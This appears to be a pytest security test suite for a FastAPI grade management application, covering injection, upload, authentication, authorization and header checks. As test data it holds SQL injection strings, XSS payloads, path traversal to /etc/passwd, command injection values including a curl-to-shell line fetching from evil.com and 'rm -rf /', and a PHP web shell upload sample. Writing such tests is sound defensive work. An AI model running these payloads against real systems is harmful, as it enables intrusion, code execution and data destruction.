"""
Security tests for the grade management system.
"""
import pytest
import json
from fastapi.testclient import TestClient
from app.core.config import settings


class TestInputValidation:
    """Test input validation and sanitization."""

    def test_sql_injection_prevention(self, client, auth_headers_admin):
        """Test SQL injection prevention in user inputs."""
        # Test SQL injection in username
        malicious_inputs = [
            "admin'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM users --",
            "admin'; INSERT INTO users (username) VALUES ('hacked'); --"
        ]

        for malicious_input in malicious_inputs:
            # Test in registration
            response = client.post(
                f"{settings.API_V1_STR}/auth/register",
                json={
                    "username": malicious_input,
                    "email": "test@example.com",
                    "password": "Test123!",
                    "full_name": "Test User",
                    "role": "student"
                }
            )
            # Should either be rejected by validation or handled safely
            assert response.status_code in [400, 422, 201]

            # Test in search
            response = client.get(
                f"{settings.API_V1_STR}/users/search?name={malicious_input}",
                headers=auth_headers_admin
            )
            # Should return empty results or validation error, not crash
            assert response.status_code in [200, 422]

    def test_xss_prevention(self, client, auth_headers_student):
        """Test XSS prevention in user inputs."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//"
        ]

        for payload in xss_payloads:
            # Test in user profile update
            response = client.put(
                f"{settings.API_V1_STR}/users/profile",
                json={
                    "full_name": payload,
                    "phone": "1234567890"
                },
                headers=auth_headers_student
            )

            if response.status_code == 200:
                # Check that script tags are escaped or removed
                user_data = response.json()
                assert "<script>" not in user_data.get("full_name", "")
                assert "javascript:" not in user_data.get("full_name", "")

    def test_path_traversal_prevention(self, client, auth_headers_teacher):
        """Test path traversal prevention."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]

        for path in malicious_paths:
            # Test in file upload endpoints
            files = {"file": ("test.txt", b"test content", "text/plain")}
            response = client.post(
                f"{settings.API_V1_STR}/courses/1/materials/upload",
                files=files,
                data={"path": path},
                headers=auth_headers_teacher
            )
            # Should reject path traversal attempts
            assert response.status_code in [400, 422, 403]

    def test_command_injection_prevention(self, client, auth_headers_admin):
        """Test command injection prevention."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl http://evil.com/steal_data.sh | sh"
        ]

        for payload in command_injection_payloads:
            # Test in course creation (which might trigger system commands)
            response = client.post(
                f"{settings.API_V1_STR}/courses/",
                json={
                    "code": f"CS101{payload}",
                    "name": "Test Course",
                    "description": "Test",
                    "credit": 3,
                    "capacity": 50,
                    "semester": "2023-2024-1",
                    "academic_year": "2023-2024",
                    "department": "Computer Science"
                },
                headers=auth_headers_admin
            )
            # Should handle safely or reject
            assert response.status_code in [201, 400, 422]

    def test_input_length_limits(self, client, auth_headers_admin):
        """Test input length limits."""
        long_string = "a" * 10000  # Very long string

        # Test in various fields
        response = client.post(
            f"{settings.API_V1_STR}/users/student",
            json={
                "username": long_string,
                "email": "test@example.com",
                "password": "Test123!",
                "full_name": "Test User",
                "role": "student"
            },
            headers=auth_headers_admin
        )
        assert response.status_code in [400, 422]

    def test_file_upload_validation(self, client, auth_headers_teacher):
        """Test file upload security validation."""
        # Test malicious file types
        malicious_files = [
            ("malware.exe", b"fake exe content", "application/octet-stream"),
            ("script.php", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("shell.sh", b"rm -rf /", "application/x-sh"),
            ("script.bat", b"format c:", "application/x-msdownload")
        ]

        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            response = client.post(
                f"{settings.API_V1_STR}/courses/1/materials/upload",
                files=files,
                headers=auth_headers_teacher
            )
            # Should reject dangerous file types
            assert response.status_code in [400, 422]

    def test_file_size_limits(self, client, auth_headers_teacher):
        """Test file size limits."""
        # Create large file (100MB)
        large_content = b"x" * (100 * 1024 * 1024)
        files = {"file": ("large.txt", large_content, "text/plain")}

        response = client.post(
            f"{settings.API_V1_STR}/courses/1/materials/upload",
            files=files,
            headers=auth_headers_teacher
        )
        # Should reject files that are too large
        assert response.status_code in [400, 413, 422]


class TestAuthenticationSecurity:
    """Test authentication security features."""

    def test_password_policy_enforcement(self, client):
        """Test password policy enforcement."""
        weak_passwords = [
            "123",           # Too short
            "password",      # Common password
            "12345678",      # Only numbers
            "abcdefgh",      # Only letters
            "Abc123",        # Too short mixed
            "password123",   # No special character
            "Password!",     # No numbers
        ]

        for password in weak_passwords:
            response = client.post(
                f"{settings.API_V1_STR}/auth/register",
                json={
                    "username": f"test_user_{password[:5]}",
                    "email": f"test_{password[:5]}@example.com",
                    "password": password,
                    "full_name": "Test User",
                    "role": "student"
                }
            )
            assert response.status_code in [400, 422]

    def test_brute_force_protection(self, client):
        """Test brute force protection."""
        # Make multiple failed login attempts
        for i in range(10):
            response = client.post(
                f"{settings.API_V1_STR}/auth/login",
                json={
                    "username": "admin",
                    "password": f"wrong_password_{i}"
                }
            )
            # Should fail each time
            assert response.status_code == 401

        # The 11th attempt should be rate limited
        response = client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={
                "username": "admin",
                "password": "Admin123!"
            }
        )
        # Should be rate limited or still fail
        assert response.status_code in [401, 429]

    def test_session_management(self, client, admin_user):
        """Test session management security."""
        # Register and login
        client.post(f"{settings.API_V1_STR}/auth/register", json=admin_user)
        login_response = client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={
                "username": admin_user["username"],
                "password": admin_user["password"]
            }
        )
        token = login_response.json()["access_token"]

        # Use token
        headers = {"Authorization": f"Bearer {token}"}
        response = client.get(f"{settings.API_V1_STR}/auth/me", headers=headers)
        assert response.status_code == 200

        # Logout
        client.post(f"{settings.API_V1_STR}/auth/logout", headers=headers)

        # Token should no longer be valid
        response = client.get(f"{settings.API_V1_STR}/auth/me", headers=headers)
        assert response.status_code == 401

    def test_jwt_token_security(self, client, admin_user):
        """Test JWT token security."""
        # Register and login
        client.post(f"{settings.API_V1_STR}/auth/register", json=admin_user)
        login_response = client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={
                "username": admin_user["username"],
                "password": admin_user["password"]
            }
        )
        token = login_response.json()["access_token"]

        # Test token manipulation
        manipulated_tokens = [
            token[:-10] + "x" * 10,  # Modify end of token
            "x" + token[1:],          # Modify beginning of token
            token.replace(".", ""),   # Remove separators
            "invalid_token"           # Completely invalid
        ]

        for manipulated_token in manipulated_tokens:
            headers = {"Authorization": f"Bearer {manipulated_token}"}
            response = client.get(f"{settings.API_V1_STR}/auth/me", headers=headers)
            assert response.status_code == 401

    def test_concurrent_session_limit(self, client, admin_user):
        """Test concurrent session limits."""
        # Register user
        client.post(f"{settings.API_V1_STR}/auth/register", json=admin_user)

        # Create multiple sessions
        tokens = []
        for i in range(5):
            login_response = client.post(
                f"{settings.API_V1_STR}/auth/login",
                json={
                    "username": admin_user["username"],
                    "password": admin_user["password"]
                }
            )
            if login_response.status_code == 200:
                tokens.append(login_response.json()["access_token"])

        # Try to use all tokens
        valid_sessions = 0
        for token in tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = client.get(f"{settings.API_V1_STR}/auth/me", headers=headers)
            if response.status_code == 200:
                valid_sessions += 1

        # Should limit concurrent sessions (implementation dependent)
        # This test verifies the mechanism exists
        assert valid_sessions >= 1


class TestAuthorizationSecurity:
    """Test authorization security."""

    def test_privilege_escalation_prevention(self, client, auth_headers_student):
        """Test privilege escalation prevention."""
        # Student trying to access admin endpoints
        admin_endpoints = [
            f"{settings.API_V1_STR}/admin/users",
            f"{settings.API_V1_STR}/admin/system-stats",
            f"{settings.API_V1_STR}/admin/audit-logs",
            f"{settings.API_V1_STR}/users/batch",
            f"{settings.API_V1_STR}/courses/",
            f"{settings.API_V1_STR}/grades/"
        ]

        for endpoint in admin_endpoints:
            # Test GET
            response = client.get(endpoint, headers=auth_headers_student)
            assert response.status_code in [401, 403, 404]

            # Test POST
            response = client.post(endpoint, json={}, headers=auth_headers_student)
            assert response.status_code in [401, 403, 404]

            # Test PUT
            response = client.put(endpoint + "/1", json={}, headers=auth_headers_student)
            assert response.status_code in [401, 403, 404]

            # Test DELETE
            response = client.delete(endpoint + "/1", headers=auth_headers_student)
            assert response.status_code in [401, 403, 404]

    def test_cross_user_data_access(self, client, auth_headers_student, auth_headers_teacher):
        """Test prevention of cross-user data access."""
        # Student trying to access other student's data
        response = client.get(
            f"{settings.API_V1_STR}/grades/student/999",
            headers=auth_headers_student
        )
        assert response.status_code in [403, 404]

        # Student trying to access teacher's courses
        response = client.get(
            f"{settings.API_V1_STR}/courses/my-courses?teacher_id=999",
            headers=auth_headers_student
        )
        assert response.status_code in [403, 404]

        # Teacher trying to access other teacher's courses
        response = client.get(
            f"{settings.API_V1_STR}/courses/999",
            headers=auth_headers_teacher
        )
        assert response.status_code in [403, 404]

    def test_resource_owner_validation(self, client, auth_headers_student):
        """Test resource owner validation."""
        # Create a grade for the student first
        grade_data = {
            "score": 85.0,
            "assignment_type": "作业",
            "assignment_name": "作业1",
            "max_score": 100,
            "weight": 20,
            "semester": "2023-2024-1",
            "academic_year": "2023-2024"
        }

        # Student trying to modify their own grade (should be forbidden)
        response = client.put(
            f"{settings.API_V1_STR}/grades/1",
            json={"score": 95.0},
            headers=auth_headers_student
        )
        assert response.status_code in [403, 404]

    def test_api_endpoint_exposure(self, client):
        """Test that sensitive endpoints are properly protected."""
        sensitive_endpoints = [
            "/api/v1/admin/",
            "/api/v1/users/",
            "/api/v1/courses/",
            "/api/v1/grades/",
            "/api/v1/auth/me",
            "/api/v1/system/info",
            "/api/v1/database/backup"
        ]

        for endpoint in sensitive_endpoints:
            # Try to access without authentication
            response = client.get(endpoint)
            assert response.status_code in [401, 403, 404]


class TestCSRFProtection:
    """Test CSRF protection mechanisms."""

    def test_csrf_token_validation(self, client, auth_headers_student):
        """Test CSRF token validation."""
        # Test POST without CSRF token
        response = client.post(
            f"{settings.API_V1_STR}/users/profile",
            json={"full_name": "Test"},
            headers=auth_headers_student
        )
        # Should require CSRF token (implementation dependent)
        # Most APIs use JWT Bearer tokens, but if CSRF protection is enabled:
        assert response.status_code in [200, 400, 403]

    def test_sameorigin_policy(self, client):
        """Test Same-Origin policy enforcement."""
        # Simulate cross-origin request
        headers = {
            "Origin": "http://evil.com",
            "Referer": "http://evil.com/evil.html"
        }

        response = client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={"username": "admin", "password": "Admin123!"},
            headers=headers
        )
        # Should handle cross-origin requests appropriately
        assert response.status_code in [200, 400, 403]


class TestDataEncryption:
    """Test data encryption and protection."""

    def test_sensitive_data_encryption(self, client, auth_headers_admin):
        """Test that sensitive data is encrypted in database."""
        # Create user with sensitive information
        user_data = {
            "username": "encrypted_user",
            "email": "encrypted@example.com",
            "password": "SuperSecretPassword123!",
            "full_name": "Encrypted User",
            "role": "student",
            "phone": "13800138000",
            "id_card": "110101199001011234"  # Sensitive ID card number
        }

        response = client.post(
            f"{settings.API_V1_STR}/users/student",
            json=user_data,
            headers=auth_headers_admin
        )

        if response.status_code == 201:
            # Check that sensitive fields are not returned in plain text
            user_response = client.get(
                f"{settings.API_V1_STR}/users/{response.json()['id']}",
                headers=auth_headers_admin
            )
            user_info = user_response.json()

            # Password should never be returned
            assert "password" not in user_info

            # Sensitive fields might be masked or encrypted
            if "id_card" in user_info:
                # Should be partially masked (e.g., "110101********1234")
                assert "*" in user_info["id_card"] or len(user_info["id_card"]) < len(user_data["id_card"])

    def test_transmission_encryption(self, client):
        """Test that data transmission is encrypted."""
        # Test that HTTPS is enforced
        response = client.get("/health")

        # In production, should redirect to HTTPS
        # This is more of a configuration test
        assert response.status_code == 200

    def test_data_backup_encryption(self, client, auth_headers_admin):
        """Test data backup encryption."""
        # Test backup endpoint (if exists)
        response = client.get(
            f"{settings.API_V1_STR}/admin/backup",
            headers=auth_headers_admin
        )

        # If endpoint exists, backup should be encrypted
        if response.status_code == 200:
            # Check that backup is not plain text
            assert not response.text.startswith('{') or response.headers.get("content-type") == "application/octet-stream"


class TestSecurityHeaders:
    """Test security headers configuration."""

    def test_security_headers_present(self, client):
        """Test that security headers are present."""
        response = client.get("/")
        headers = response.headers

        # Check for important security headers
        security_headers = [
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection",
            "strict-transport-security",
            "content-security-policy"
        ]

        for header in security_headers:
            # Headers should be present (some might be optional based on config)
            assert header.lower() in [h.lower() for h in headers.keys()] or header == "strict-transport-security"

    def test_cors_configuration(self, client):
        """Test CORS configuration."""
        # Test preflight request
        response = client.options(
            f"{settings.API_V1_STR}/auth/login",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )

        assert response.status_code == 200
        assert "access-control-allow-origin" in response.headers

    def test_content_type_sniffing_prevention(self, client):
        """Test content-type sniffing prevention."""
        response = client.get("/health")

        # Should have X-Content-Type-Options: nosniff
        assert response.headers.get("x-content-type-options", "").lower() == "nosniff"

    def test_clickjacking_prevention(self, client):
        """Test clickjacking prevention."""
        response = client.get("/")

        # Should have X-Frame-Options header
        frame_options = response.headers.get("x-frame-options", "").lower()
        assert frame_options in ["deny", "sameorigin"]


class TestAuditLogging:
    """Test audit logging functionality."""

    def test_login_attempts_logged(self, client, admin_user):
        """Test that login attempts are logged."""
        # Failed login attempt
        client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={"username": admin_user["username"], "password": "wrong_password"}
        )

        # Successful login attempt
        client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={"username": admin_user["username"], "password": admin_user["password"]}
        )

        # Check if audit logs are accessible (admin only)
        # This would require implementing audit log endpoints
        # For now, just verify the system doesn't crash
        assert True

    def test_sensitive_operations_logged(self, client, auth_headers_admin):
        """Test that sensitive operations are logged."""
        # User creation
        response = client.post(
            f"{settings.API_V1_STR}/users/student",
            json={
                "username": "audit_test_user",
                "email": "audit@example.com",
                "password": "Test123!",
                "full_name": "Audit Test",
                "role": "student"
            },
            headers=auth_headers_admin
        )

        if response.status_code == 201:
            # User deletion
            client.delete(
                f"{settings.API_V1_STR}/users/{response.json()['id']}",
                headers=auth_headers_admin
            )

        # Operations should be logged
        assert True